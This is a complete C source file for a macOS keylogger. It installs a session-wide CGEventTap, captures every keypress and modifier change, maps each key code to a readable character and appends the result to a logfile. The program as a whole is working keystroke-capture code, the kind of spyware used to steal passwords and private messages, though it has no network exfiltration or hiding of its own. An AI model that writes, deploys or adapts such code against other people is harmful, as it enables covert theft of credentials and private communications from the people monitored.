#include "keylogger.h"

int keyCodeCache[127];
int capsLock = 57;
int leftShift = 56;
int rightShift = 60;

int main(int argc, const char *argv[]) {

    // Create an event tap to retrieve keypresses.
    CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);
    CFMachPortRef eventTap = CGEventTapCreate(
        kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, CGEventCallback, NULL
    );

    // Exit the program if unable to create the event tap.
    if (!eventTap) {
        fprintf(stderr, "ERROR: Unable to create event tap.\n");
        exit(1);
    }

    // Create a run loop source and add enable the event tap.
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);


    // Clear the logfile if clear argument used or log to specific file if given.
    if (argc == 2) {
        if (strcmp(argv[1], "clear") == 0) {
            fopen(logfileLocation, "w");
            printf("%s cleared.\n", logfileLocation);
            fflush(stdout);
            exit(1);
        } else {
            logfileLocation = argv[1];
        }
    }

    // Get the current time and open the logfile.
    time_t result = time(NULL);
    logfile = fopen(logfileLocation, "a");

    if (!logfile) {
        fprintf(stderr, "ERROR: Unable to open log file. Ensure that you have the proper permissions.\n");
        exit(1);
    }

    // Output to logfile.
    fprintf(logfile, "\n\nKeylogging has begun.\n%s\n", asctime(localtime(&result)));
    fflush(logfile);

    // Display the location of the logfile and start the loop.
    printf("Logging to: %s\n", logfileLocation);
    fflush(stdout);
    CFRunLoopRun();

    return 0;
}

// The following callback method is invoked on every keypress.
CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    if (type != kCGEventKeyDown && type != kCGEventFlagsChanged) {
        return event;
    }

    // Retrieve the incoming keycode.
    CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

    if (keyCode == leftShift || keyCode == rightShift || keyCode == capsLock) {
        keyCodeCache[keyCode] = keyCodeCache[keyCode] == 1 ? 0 : 1;
        return event;
    }

    // Print the human readable key to the logfile.
    bool shift = keyCodeCache[rightShift] + keyCodeCache[leftShift] > 0;
    bool caps = keyCodeCache[capsLock] == 1;
    if (keyCodeCache[rightShift]) {
        fprintf(logfile, "%d::%s", rightShift, "[right-shift]\n");
    }
    if (keyCodeCache[leftShift]) {
        fprintf(logfile, "%d::%s", leftShift, "[left-shift]\n");
    }
    if (keyCodeCache[caps]) {
        fprintf(logfile, "%d::%s", caps, "[caps]\n");
    }

    fprintf(logfile, "%d::%s", keyCode, convertKeyCode(keyCode, shift, caps));
    fflush(logfile);
    return event;
}

// The following method converts the key code returned by each keypress as
// a human readable key code in const char format.
const char *convertKeyCode(int keyCode, bool shift, bool caps) {
    switch ((int) keyCode) {
        case 0:   return "a\n";
        case 1:   return "s\n";
        case 2:   return "d\n";
        case 3:   return "f\n";
        case 4:   return "h\n";
        case 5:   return "g\n";
        case 6:   return "z\n";
        case 7:   return "x\n";
        case 8:   return "c\n";
        case 9:   return "v\n";
        case 11:  return "b\n";
        case 12:  return "q\n";
        case 13:  return "w\n";
        case 14:  return "e\n";
        case 15:  return "r\n";
        case 16:  return "y\n";
        case 17:  return "t\n";
        case 18:  return shift ? "!\n" : "1\n";
        case 19:  return shift ? "@\n" : "2\n";
        case 20:  return shift ? "#\n" : "3\n";
        case 21:  return shift ? "$\n" : "4\n";
        case 22:  return shift ? "^\n" : "6\n";
        case 23:  return shift ? "%\n" : "5\n";
        case 24:  return shift ? "+\n" : "=\n";
        case 25:  return shift ? "(\n" : "9\n";
        case 26:  return shift ? "&\n" : "7\n";
        case 27:  return shift ? "_\n" : "-\n";
        case 28:  return shift ? "*\n" : "8\n";
        case 29:  return shift ? ")\n" : "0\n";
        case 30:  return shift ? "}\n" : "]\n";
        case 31:  return "o\n";
        case 32:  return "u\n";
        case 33:  return shift ? "{\n" : "[\n";
        case 34:  return "i\n";
        case 35:  return "p\n";
        case 37:  return "l\n";
        case 38:  return "j\n";
        case 39:  return shift ? "\"\n" : "'\n";
        case 40:  return "k\n";
        case 41:  return shift ? ":\n" : ";\n";
        case 42:  return shift ? "|\n" : "\\\n";
        case 43:  return shift ? "<\n" : ",\n";
        case 44:  return shift ? "?\n" : "/\n";
        case 45:  return "n\n";
        case 46:  return "m\n";
        case 47:  return shift ? ">\n" : ".\n";
        case 50:  return shift ? "~\n" : "`\n";
        case 65:  return "[decimal]\n";
        case 67:  return "[asterisk]\n";
        case 69:  return "[plus]\n";
        case 71:  return "[clear]\n";
        case 75:  return "[divide]\n";
        case 76:  return "[enter]\n";
        case 78:  return "[hyphen]\n";
        case 81:  return "[equals]\n";
        case 82:  return "0\n";
        case 83:  return "1\n";
        case 84:  return "2\n";
        case 85:  return "3\n";
        case 86:  return "4\n";
        case 87:  return "5\n";
        case 88:  return "6\n";
        case 89:  return "7\n";
        case 91:  return "8\n";
        case 92:  return "9\n";
        case 36:  return "[return]\n";
        case 48:  return "[tab]\n";
        case 49:  return " \n";
        case 51:  return "[del]\n";
        case 53:  return "[esc]\n";
        case 54:  return "[right-cmd]\n";
        case 55:  return "[left-cmd]\n";
        case 56:  return "[left-shift]\n";
        case 57:  return "[caps]\n";
        case 58:  return "[left-option]\n";
        case 59:  return "[left-ctrl]\n";
        case 60:  return "[right-shift]\n";
        case 61:  return "[right-option]\n";
        case 62:  return "[right-ctrl]\n";
        case 63:  return "[fn]\n";
        case 64:  return "[f17]\n";
        case 72:  return "[volup]\n";
        case 73:  return "[voldown]\n";
        case 74:  return "[mute]\n";
        case 79:  return "[f18]\n";
        case 80:  return "[f19]\n";
        case 90:  return "[f20]\n";
        case 96:  return "[f5]\n";
        case 97:  return "[f6]\n";
        case 98:  return "[f7]\n";
        case 99:  return "[f3]\n";
        case 100: return "[f8]\n";
        case 101: return "[f9]\n";
        case 103: return "[f11]\n";
        case 105: return "[f13]\n";
        case 106: return "[f16]\n";
        case 107: return "[f14]\n";
        case 109: return "[f10]\n";
        case 111: return "[f12]\n";
        case 113: return "[f15]\n";
        case 114: return "[help]\n";
        case 115: return "[home]\n";
        case 116: return "[pgup]\n";
        case 117: return "[fwddel]\n";
        case 118: return "[f4]\n";
        case 119: return "[end]\n";
        case 120: return "[f2]\n";
        case 121: return "[pgdown]\n";
        case 122: return "[f1]\n";
        case 123: return "[left]\n";
        case 124: return "[right]\n";
        case 125: return "[down]\n";
        case 126: return "[up]\n";
    }
    return "[unknown]\n";
}
